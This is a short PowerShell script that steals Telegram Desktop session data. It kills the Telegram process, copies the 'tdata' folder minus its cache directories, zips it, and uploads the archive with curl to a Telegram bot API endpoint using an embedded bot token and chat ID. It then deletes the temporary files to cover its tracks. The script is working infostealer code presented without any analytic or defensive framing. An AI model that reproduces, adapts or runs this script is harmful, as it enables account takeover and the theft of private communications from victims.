
taskkill /f /im Telegram.exe;
    $t="$env:APPDATA\\Telegram Desktop\\tdata"
    if(!(Test-Path $t)){exit}
    $d="$env:TMP\\t"
    ni $d -ItemType Directory -Force
    gci "$t" | ? { $_.Name -notmatch "^(cache|dumps|temp|media_cache)$" } | % { cp $_.FullName $d -Recurse -Force }
    $z="$env:TMP\\t.zip"
    Compress-Archive "$d\\*" $z -Force
    ri $d -Recurse -Force
    curl.exe -s -F "chat_id=8115479934" -F "document=@$z" https://api.telegram.org/bot8896140664:AAG3GYY_qygOReI-JTOisou02Lfj3NdavQo/sendDocument
    ri $z -Force;exit
